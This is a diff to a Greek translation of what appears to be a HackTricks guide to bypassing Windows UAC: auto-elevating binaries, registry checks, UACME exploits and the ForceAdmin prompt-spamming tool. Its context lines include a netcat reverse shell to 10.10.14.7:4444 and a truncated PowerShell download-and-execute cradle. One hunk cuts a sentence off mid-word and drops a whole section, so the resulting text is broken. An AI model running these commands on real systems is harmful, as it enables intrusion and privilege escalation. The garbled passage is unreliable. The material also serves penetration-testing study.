@@ -20,8 +20,8 @@
 | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
 | [Έλεγχος Λογαριασμού Χρήστη: Λειτουργία Έγκρισης Διαχειριστή για τον ενσωματωμένο λογαριασμό διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Απενεργοποιημένο                                                     |
 | [Έλεγχος Λογαριασμού Χρήστη: Επιτρέψτε στις εφαρμογές UIAccess να ζητούν ανύψωση χωρίς να χρησιμοποιούν την ασφαλή επιφάνεια εργασίας](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Απενεργοποιημένο                                                     |
-| [Έλεγχος Λογαριασμού Χρήστη: Συμπεριφορά της προτροπής ανύψωσης για διαχειριστές στη Λειτουργία Έγκρισης Διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Προτροπή για συγκατάθεση για μη Windows δυαδικά                  |
-| [Έλεγχος Λογαριασμού Χρήστη: Συμπεριφορά της προτροπής ανύψωσης για τυπικούς χρήστες](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Προτροπή για διαπιστευτήρια στην ασφαλή επιφάνεια εργασίας                 |
+| [Έλεγχος Λογαριασμού Χρήστη: Συμπεριφορά της προτροπής ανύψωσης για διαχειριστές στη Λειτουργία Έγκρισης Διαχειριστή](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Ζητήστε συγκατάθεση για μη Windows δυαδικά                  |
+| [Έλεγχος Λογαριασμού Χρήστη: Συμπεριφορά της προτροπής ανύψωσης για τυπικούς χρήστες](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Ζητήστε διαπιστευτήρια στην ασφαλή επιφάνεια εργασίας                 |
 | [Έλεγχος Λογαριασμού Χρήστη: Ανίχνευση εγκαταστάσεων εφαρμογών και προτροπή για ανύψωση](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Ενεργοποιημένο (προεπιλογή για οικιακή χρήση) Απενεργοποιημένο (προεπιλογή για επιχείρηση) |
 | [Έλεγχος Λογαριασμού Χρήστη: Μόνο ανύψωση εκτελέσιμων που είναι υπογεγραμμένα και επικυρωμένα](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Απενεργοποιημένο                                                     |
 | [Έλεγχος Λογαριασμού Χρήστη: Μόνο ανύψωση εφαρμογών UIAccess που είναι εγκατεστημένες σε ασφαλείς τοποθεσίες](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Ενεργοποιημένο                                                      |
@@ -31,15 +31,9 @@
 
 ### Θεωρία Παράκαμψης UAC
 
-Ορισμένα προγράμματα είναι **αυτοανυψωμένα αυτόματα** εάν ο **χρήστης ανήκει** στην **ομάδα διαχειριστών**. Αυτές οι δυαδικές έχουν μέσα στα _**Manifests**_ την επιλογή _**autoElevate**_ με τιμή _**True**_. Η δυαδική πρέπει επίσης να είναι **υπογεγραμμένη από τη Microsoft**.
+Ορισμένα προγράμματα είναι **αυτοανυψωμένα αυτόματα** εάν ο **χρήστης ανήκει** στην **ομάδα διαχειριστών**. Αυτά τα δυαδικά έχουν μέσα στα _**Manifests**_ την επιλογή _**autoElevate**_ με τιμή _**True**_. Το δυαδικό πρέπει επίσης να είναι **υπογεγραμμένο από τη Microsoft**.
 
-Στη συνέχεια, για να **παρακάμψουν** τον **UAC** (ανύψωση από **μεσαίο** επίπεδο ακεραιότητας **σε υψηλό**) ορισμένοι επιτιθέμενοι χρησιμοποιούν αυτούς τους τύπους δυαδικών για να **εκτελέσουν αυθαίρετο κώδικα** επειδή θα εκτελούνται από μια **Διαδικασία Υψηλού επιπέδου ακεραιότητας**.
-
-Μπορείτε να **ελέγξετε** το _**Manifest**_ μιας δυαδικής χρησιμοποιώντας το εργαλείο _**sigcheck.exe**_ από το Sysinternals. Και μπορείτε να **δείτε** το **επίπεδο ακεραιότητας** των διαδικασιών χρησιμοποιώντας το _Process Explorer_ ή το _Process Monitor_ (του Sysinternals).
-
-### Έλεγχος UAC
-
-Για να επιβεβαιώσετε αν είναι ενεργοποιημένος ο UAC, κάντε:
+Στη συνέχεια, για να **παρακάμψουν** τον **UAC** (ανύψωση από **μεσαίο** επίπεδο ακεραιότητας **σε υψηλό**) ορισμένοι επιτιθέμενοι χρησιμοποιούν αυτούς τους τύπους δυαδικών για να **εκτελέσουν αυθαίρετο κώδικα** επειδή θα εκτελούνται από μια **Διαδικασία Υψη
 ```
 REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA
 
@@ -65,8 +59,8 @@ ConsentPromptBehaviorAdmin    REG_DWORD    0x5
 Στη συνέχεια, πρέπει να ρίξετε μια ματιά στην τιμή του **`LocalAccountTokenFilterPolicy`**\
 Αν η τιμή είναι **`0`**, τότε, μόνο ο χρήστης **RID 500** (**ενσωματωμένος Διαχειριστής**) μπορεί να εκτελεί **διοικητικά καθήκοντα χωρίς UAC**, και αν είναι `1`, **όλοι οι λογαριασμοί μέσα στην ομάδα "Administrators"** μπορούν να τα εκτελούν.
 
-Και, τέλος, ρίξτε μια ματιά στην τιμή του κλειδιού **`FilterAdministratorToken`**\
-Αν **`0`**(προεπιλογή), ο **ενσωματωμένος λογαριασμός Διαχειριστή μπορεί** να εκτελεί απομακρυσμένα διοικητικά καθήκοντα και αν **`1`** ο ενσωματωμένος λογαριασμός Διαχειριστή **δεν μπορεί** να εκτελεί απομακρυσμένα διοικητικά καθήκοντα, εκτός αν το `LocalAccountTokenFilterPolicy` είναι ρυθμισμένο σε `1`.
+Και, τελικά, ρίξτε μια ματιά στην τιμή του κλειδιού **`FilterAdministratorToken`**\
+Αν **`0`**(προεπιλογή), ο **ενσωματωμένος λογαριασμός Διαχειριστή μπορεί** να εκτελεί απομακρυσμένα διοικητικά καθήκοντα και αν **`1`** ο ενσωματωμένος λογαριασμός Διαχειριστή **δεν μπορεί** να εκτελεί απομακρυσμένα διοικητικά καθήκοντα, εκτός αν το `LocalAccountTokenFilterPolicy` έχει οριστεί σε `1`.
 
 #### Περίληψη
 
@@ -87,7 +81,7 @@ whoami /groups | findstr Level
 > [!NOTE]
 > Σημειώστε ότι αν έχετε γραφική πρόσβαση στο θύμα, η παράκαμψη UAC είναι απλή καθώς μπορείτε απλά να κάνετε κλικ στο "Ναι" όταν εμφανιστεί το παράθυρο προτροπής UAC
 
-Η παράκαμψη UAC είναι απαραίτητη στην εξής κατάσταση: **η UAC είναι ενεργοποιημένη, η διαδικασία σας εκτελείται σε μέσο επίπεδο ακεραιότητας και ο χρήστης σας ανήκει στην ομάδα διαχειριστών**.
+Η παράκαμψη UAC είναι απαραίτητη στην εξής κατάσταση: **η UAC είναι ενεργοποιημένη, η διαδικασία σας εκτελείται σε ένα μέσο επίπεδο ακεραιότητας και ο χρήστης σας ανήκει στην ομάδα διαχειριστών**.
 
 Είναι σημαντικό να αναφερθεί ότι είναι **πολύ πιο δύσκολο να παρακαμφθεί η UAC αν είναι στο υψηλότερο επίπεδο ασφάλειας (Πάντα) από ότι αν είναι σε οποιοδήποτε από τα άλλα επίπεδα (Προεπιλογή).**
 
@@ -99,12 +93,12 @@ whoami /groups | findstr Level
 Start-Process powershell -Verb runAs "calc.exe"
 Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
 ```
-#### UAC παρακάμψη με αντιγραφή διακριτικού
+#### Παράκαμψη UAC με αντιγραφή διακριτικού
 
 - [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
 - [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)
 
-### **Πολύ** Βασική UAC "παρακάμψη" (πλήρης πρόσβαση στο σύστημα αρχείων)
+### **Πολύ** Βασική "παράκαμψη" UAC (πλήρης πρόσβαση στο σύστημα αρχείων)
 
 Αν έχετε ένα shell με έναν χρήστη που είναι μέσα στην ομάδα Διαχειριστών, μπορείτε να **τοποθετήσετε το C$** κοινόχρηστο μέσω SMB (σύστημα αρχείων) τοπικά σε έναν νέο δίσκο και θα έχετε **πρόσβαση σε όλα μέσα στο σύστημα αρχείων** (ακόμα και στον φάκελο του Διαχειριστή).
 
@@ -135,11 +129,11 @@ runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.w
 
 ### KRBUACBypass
 
-Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
+Τεκμηρίωση και εργαλείο στο [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)
 
 ### UAC bypass exploits
 
-[**UACME** ](https://github.com/hfiref0x/UACME) που είναι μια **συλλογή** από αρκετά UAC bypass exploits. Σημειώστε ότι θα χρειαστεί να **compile UACME χρησιμοποιώντας visual studio ή msbuild**. Η συλλογή θα δημιουργήσει αρκετά executables (όπως `Source\Akagi\outout\x64\Debug\Akagi.exe`), θα χρειαστεί να ξέρετε **ποιο χρειάζεστε.**\
+[**UACME** ](https://github.com/hfiref0x/UACME) που είναι μια **συλλογή** αρκετών UAC bypass exploits. Σημειώστε ότι θα χρειαστεί να **compile UACME χρησιμοποιώντας visual studio ή msbuild**. Η συλλογή θα δημιουργήσει αρκετά executables (όπως `Source\Akagi\outout\x64\Debug\Akagi.exe`), θα χρειαστεί να γνωρίζετε **ποιο χρειάζεστε.**\
 Πρέπει να **είστε προσεκτικοί** γιατί μερικά bypass θα **προκαλέσουν κάποια άλλα προγράμματα** που θα **ειδοποιήσουν** τον **χρήστη** ότι κάτι συμβαίνει.
 
 Το UACME έχει την **έκδοση build από την οποία κάθε τεχνική άρχισε να λειτουργεί**. Μπορείτε να αναζητήσετε μια τεχνική που επηρεάζει τις εκδόσεις σας:
@@ -170,7 +164,7 @@ Major  Minor  Build  Revision
 
 ### Θορυβώδης brute-force παράκαμψη UAC
 
-Αν δεν σας νοιάζει να είστε θορυβώδεις, μπορείτε πάντα να **τρέξετε κάτι όπως** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) που **ζητά να ανυψώσει τα δικαιώματα μέχρι ο χρήστης να το αποδεχθεί**.
+Αν δεν σας νοιάζει να είστε θορυβώδεις, μπορείτε πάντα να **τρέξετε κάτι όπως** [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) που **ζητά να ανυψώσει δικαιώματα μέχρι ο χρήστης να το αποδεχθεί**.
 
 ### Η δική σας παράκαμψη - Βασική μεθοδολογία παράκαμψης UAC
 
@@ -185,6 +179,6 @@ Major  Minor  Build  Revision
 
 ### Μια άλλη τεχνική παράκαμψης UAC
 
-Αποτελείται από την παρακολούθηση αν ένα **αυτοανυψωμένο δυαδικό αρχείο** προσπαθεί να **διαβάσει** από το **μητρώο** το **όνομα/διαδρομή** ενός **δυαδικού αρχείου** ή **εντολής** που θα **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το δυαδικό αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).
+Αποτελείται από την παρακολούθηση αν ένα **αυτοανυψωμένο δυαδικό αρχείο** προσπαθεί να **διαβάσει** από το **μητρώο** το **όνομα/διαδρομή** ενός **δυαδικού** ή **εντολής** που θα **εκτελεστεί** (αυτό είναι πιο ενδιαφέρον αν το δυαδικό αναζητά αυτές τις πληροφορίες μέσα στο **HKCU**).
 
 {{#include ../../banners/hacktricks-training.md}}
